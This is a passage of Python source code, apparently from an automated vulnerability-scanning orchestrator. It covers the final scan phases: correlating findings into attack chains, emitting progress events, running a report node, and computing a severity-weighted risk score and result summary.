                    elif isinstance(f, dict):
                        d = f
                    else:
                        continue
                    finding_dicts.append(d)

                correlation_result = self._correlation_engine.correlate(finding_dicts)

                # Emit correlation events
                chains = correlation_result.get("chains", [])
                if chains:
                    await self.emitter.emit("attack_chain_created", {
                        "scan_id":      scan_id,
                        "chain_count":  len(chains),
                        "top_chain":    chains[0].get("name", "") if chains else "",
                        "amplified_risk": correlation_result.get("risk_amplification", 0),
                        "message":      (
                            f"Correlation Engine: {len(chains)} attack chains identified, "
                            f"risk amplification: {correlation_result.get('risk_amplification', 0)}"
                        ),
                    }, scan_id)

                    # Add chain nodes to graph
                    for chain in chains[:5]:
                        chain_id = chain.get("chain_id", "")
                        self.emitter.add_graph_node({
                            "id":     chain_id,
                            "label":  chain.get("name", "Attack Chain")[:40],
                            "type":   "exploit",
                            "risk":   "critical" if chain.get("risk_score", 0) > 50 else "high",
                            "status": "compromised",
                        })

                gaps = correlation_result.get("coverage_gaps", [])
                if gaps:
                    await self.emitter.emit("report_generated", {
                        "node":    "CorrelationEngine",
                        "message": f"Coverage gaps: {', '.join(gaps[:3])}{'...' if len(gaps) > 3 else ''}",
                    }, scan_id)

            except Exception as exc:
                logger.error(f"[Correlation] Error: {exc}", exc_info=True)

        # Transition: → RISK_SCORING
        if self._state_machine:
            self._state_machine.transition(ScanPhase.RISK_SCORING)

        # ═══════════════════════════════════════════════════════════════════
        # PHASE 6: Report-AI Consolidation
        # ═══════════════════════════════════════════════════════════════════

        if self._state_machine:
            self._state_machine.transition(ScanPhase.REPORTING)

        context["all_findings"] = all_findings
        context["correlation"]  = correlation_result
        context["attack_chains"] = correlation_result.get("chains", [])
        report_nodes = [n for n in active_nodes if n.name == "Report-AI"]
        for node in report_nodes:
            await node.execute(target, scan_id, context)

        # Final graph snapshot
        self.emitter._graph_update_counter = 2
        self.emitter._push_graph_update(scan_id)

        # ═══════════════════════════════════════════════════════════════════
        # PHASE 7: Final Scoring & Learning
        # ═══════════════════════════════════════════════════════════════════

        severity_counts = {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0}
        for f in all_findings:
            sev = f.severity.lower() if hasattr(f, "severity") else "info"
            if sev in severity_counts:
                severity_counts[sev] += 1

        risk_score = min(100,
            severity_counts["critical"] * 25 +
            severity_counts["high"]     * 10 +
            severity_counts["medium"]   *  3 +
            severity_counts["low"]      *  1
        )

        # Apply correlation amplification
        amplified_risk = correlation_result.get("risk_amplification", risk_score)
        final_risk = max(risk_score, int(amplified_risk))

        elapsed_total = round(time.time() - scan_start, 2)

        # Transition: → COMPLETED
        if self._state_machine:
            self._state_machine.transition(ScanPhase.COMPLETED)

        # Emit final events
        await self.emitter.emit(NodeEvent.SWARM_COMPLETED, {
            "scan_id":          scan_id,
            "target":           target,
            "total_findings":   len(all_findings),
            "severity_counts":  severity_counts,
            "risk_score":       final_risk,
            "correlation":      correlation_result.get("summary", {}),
            "attack_chains":    len(correlation_result.get("chains", [])),
            "elapsed_seconds":  elapsed_total,
            "agents_deployed":  total_agents,
            "state_machine":    self._state_machine.get_timings() if self._state_machine else {},
            "message":          (
                f"Swarm v5.2 scan complete: {len(all_findings)} findings | "
                f"Risk score {final_risk}/100 | "
                f"{len(correlation_result.get('chains', []))} attack chains | "
                f"{elapsed_total}s elapsed"
            ),
        }, scan_id)

        await self.emitter.emit("complete", {
            "scan_id":         scan_id,
            "total_findings":  len(all_findings),
            "severity_counts": severity_counts,
            "risk_score":      final_risk,
        }, scan_id)

        # Build final result
        finding_dicts = []
        for f in all_findings:
            try:
                if hasattr(f, 'to_dict'):
                    finding_dicts.append(f.to_dict())
                elif isinstance(f, dict):
                    finding_dicts.append(f)
            except Exception:
                pass

        return {
            "scan_id":          scan_id,
            "findings":         finding_dicts,
            "total_findings":   len(all_findings),
            "severity_counts":  severity_counts,
            "risk_score":       final_risk,
            "attack_graph":     self.emitter.get_attack_graph(),
            "correlation":      correlation_result,
            "phase_timings":    self._state_machine.get_timings() if self._state_machine else {},
            "agents_deployed":  total_agents,
            "elapsed_seconds":  elapsed_total,
        }

    def start_scan(self, target: str, scan_id: str,
                   depth: str = "deep", strategy: str = "autonomous") -> str:
        task = asyncio.create_task(
            self.execute_swarm_scan(target, scan_id, depth=depth, strategy=strategy)
        )
        self.active_scans[scan_id] = task
        return scan_id

    # ── Query Methods ─────────────────────────────────────────────────────

    def get_learning_insights(self) -> Dict:
        """Get learning engine insights."""
        if self._learning_engine:
            return {
                "agent_performance":     self._learning_engine.get_agent_performance(),
                "recommendations":       self._learning_engine.get_recommendations(),
                "heuristic_updates":     self._learning_engine.get_heuristic_updates(),
                "payload_effectiveness": self._learning_engine.get_payload_effectiveness(),
                "scan_history":          self._learning_engine.get_scan_history_summary(),
            }
        return {}

    def get_correlation_data(self) -> Dict:
        """Get latest correlation results."""
        if self._correlation_engine:
            return {
                "chains": [c.to_dict() for c in self._correlation_engine.get_chains()],
                "groups": len(self._correlation_engine.get_groups()),
            }
        return {}


# ── Singleton ──────────────────────────────────────────────────────────────────

_orchestrator: Optional[SwarmOrchestrator] = None


def get_swarm_orchestrator() -> SwarmOrchestrator:
    global _orchestrator
    if _orchestrator is None:
        _orchestrator = SwarmOrchestrator()
    return _orchestrator
